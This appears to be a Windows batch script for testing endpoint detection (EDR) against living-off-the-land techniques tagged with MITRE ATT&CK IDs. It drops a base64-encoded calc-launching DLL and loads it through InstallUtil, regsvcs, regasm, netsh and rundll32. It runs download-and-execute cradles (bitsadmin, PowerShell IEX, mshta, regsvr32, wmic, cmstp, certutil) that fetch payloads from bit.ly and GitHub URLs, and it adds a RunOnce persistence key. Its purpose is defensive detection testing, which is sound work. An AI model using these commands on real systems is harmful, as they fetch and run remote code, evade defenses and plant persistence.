REM Source of inspiration: https://github.com/api0cradle/LOLBAS/tree/master/OSBinaries
REM Source of inspiration: https://attack.mitre.org/wiki/Main_Page
REM Author: op7ic
REM Description: Test the detection of various scripts/downloads/execs against your EDR solution.
REM Warning: You might have to click on few windows to close script execution. Don't run this on live system!
REM Version: 0.1a

echo "[+] Dumping DLL file which runs calc.exe (x86)"
REM - DLL taken from https://github.com/peterferrie/win-exec-calc-shellcode
echo -----BEGIN CERTIFICATE----- > fi.b64
echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v >> fi.b64
echo dCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACpUmPY7TMNi+0zDYvtMw2L >> fi.b64
echo i93Di+wzDYvtMw2L7DMNiy07RIvsMw2LLTtKi+wzDYtSaWNo7TMNiwAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFBFAABMAQMAwd7lUgAAAAAAAAAA4AAOIQsBBwoAAgAA >> fi.b64
echo AAQAAAAAAAAAEAAAABAAAAAgAAAAAAAQABAAAAACAAAEAAAAAAAAAAQAAAAAAAAA >> fi.b64
echo AEAAAAAEAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAgAABYAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABdAAAAABAAAAACAAAABAAA >> fi.b64
echo AAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAAWAAAAAAgAAAAAgAAAAYAAAAAAAAAAAAA >> fi.b64
echo AAAAAEAAAEAucmVsb2MAAAgAAAAAMAAAAAIAAAAIAAAAAAAAAAAAAAAAAABAAABC >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAFWL7OgIAAAAM8BdwgwAzMxgMdJSaGNhbGNUWVJRZIty >> fi.b64
echo MIt2DIt2DK2LMIt+GItfPItcH3iLdB8gAf6LVB8kD7csF0JCrYE8B1dpbkV18It0 >> fi.b64
echo HxwB/gM8rv/XWFhhwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAMHe5VIAAAAAMiAAAAEAAAABAAAAAQAAACggAAAsIAAAMCAAAAAQAABMIAAA >> fi.b64
echo AAB3MzItZGxsLXJ1bi1zaGVsbGNvZGUuZGxsAF9EbGxNYWluQDEyAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> fi.b64
echo AAAAAAAAAAAAAAAAAAAAAA== >> fi.b64
echo -----END CERTIFICATE----- >> fi.b64

certutil -f -decode fi.b64 AllTheThings.dll >nul

echo "[+] T1197 - Testing bitsadmin"

bitsadmin.exe /transfer /Download http://bit.ly/L3g1tCrad1e Default_File_Path.ps1

echo "[+] T1118 - Testing InstallUtil x86"
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

echo "[+] T1118 - Testing InstallUtil x64"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll

echo "[+] T1170 - Testing mshtha"

mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();

echo "[+] T1086 - Testing powershell cradle - WebClient"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"

echo "[+] T1121 - Testing regsvcs"

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll

echo "[+] T1121 - Testing regasm"

C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U AllTheThings.dll

echo "[+] T1121 - Testing regasm x64"

C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

echo "[+] T1117 -  Testing regsvr32 "
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct scrobj.dll

echo "[+] TXXXX - Testing MSBuild"

echo ^<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^> > xxxFile.csproj
echo    ^<ItemGroup^>   >> xxxFile.csproj
echo         ^<Binaries Include="*.dll;*.exe"/^>   >> xxxFile.csproj
echo     ^</ItemGroup^>   >> xxxFile.csproj
echo   ^<Target Name="SetACL"^>   >> xxxFile.csproj
echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
echo     ^</Target^>   >> xxxFile.csproj
echo ^</Project^>   >> xxxFile.csproj

start "" C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj

echo "[+] T1047 - Testing wmic download"

start "" wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"

echo "[+] T1191 - Testing cmstp download"

start "" cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     

echo "[+] TXXXX - Testing diskshadow exec"

echo exec calc.exe > diskshadow.txt
start "" diskshadow.exe /s diskshadow.txt  

echo "[+] TXXXX - Testing Esentutl.exe download"

start "" esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
start "" adrestore.exe   

echo "[+] TXXXX - Testing replace.exe download"

replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
start "" adrestore2.exe   

echo "[+] TXXXX - Testing SyncAppvPublishingServer.vbs download & 
start "" C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"

echo "[+] TXXXX - Testing HH.exe download"

start "" HH.exe http://bit.ly/L3g1tCrad1e

echo "[+] TXXXX - Testing ieexec.exe download & execute"exec"

REM - this is faulty case. Need .EXE file hosted ...
start "" ieexec.exe https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct

echo "[+] T1128 - Testing netsh.exe dll exec"

netsh trace start capture=yes filemode=append persistent=yes tracefile=trace.etl    
netsh trace show status    
netsh.exe add helper AllTheThings.dll
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8000 connectaddress=192.168.1.1
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
netsh trace stop

echo "[+] T1085 - Testing rundll32 execution"
start "" rundll32 AllTheThings.dll,EntryPoint

echo "[+] T1085 - Testing rundll32 download & exec"
start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

echo "[+] T1085 - Testing rundll32 exec"
start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe && exit",0,true);}

echo "[+] TXXXX - Testing Setupapi driever installation & exec"
echo ^; DRIVER.INF > calc.inf
echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc.inf
echo [Version] >> calc.inf
echo Signature = "$CHICAGO$" >> calc.inf
echo Class=61883 >> calc.inf
echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc.inf
echo Provider=%Msft% >> calc.inf
echo DriverVer=06/21/2006,6.1.7600.16385 >> calc.inf
echo [DestinationDirs] >> calc.inf
echo DefaultDestDir = 1 >> calc.inf
echo [DefaultInstall] >> calc.inf
echo AddReg = CalcStart >> calc.inf
echo [CalcStart]
echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf

start "" rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf

echo "[+] TXXXX - Testing Shdocvw exec via rundll32"

echo [InternetShortcut] > C:\windows\temp\url.url
echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
start "" rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url

echo "[+] T1130 - Testing certutil download and exec"

start "" certutil.exe -urlcache -split -f http://bit.ly/L3g1tCrad1e Default_File_Path2.ps1  


echo [+] Cleanup

del xxxFile.csproj
del AllTheThings.dll
del fi.b64
del diskshadow.txt 
del adrestore.exe
del Default_File_Path.ps1
del trace.etl
del adrestore2.exe
del trace.etl
del trace.cab
del calc.inf
del C:\windows\temp\url.url
del Default_File_Path2.ps1
